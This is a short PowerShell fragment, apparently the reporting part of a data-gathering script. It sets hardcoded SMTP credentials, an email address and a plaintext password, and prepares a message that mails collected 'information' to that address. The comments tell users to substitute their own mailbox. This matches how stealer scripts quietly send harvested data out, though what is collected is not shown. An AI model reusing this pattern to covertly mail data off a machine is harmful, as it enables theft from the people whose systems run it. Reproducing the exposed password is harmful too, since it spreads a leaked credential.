...
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ax0n3e@proton.me', 'Plokijop95@') #Email with which you want to send information
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'ax0n3e@proton.me' #Email in which you want to receice the information
$ReportEmail.To.Add('ax0n3e@proton.me') #Email in which you want to receive the information
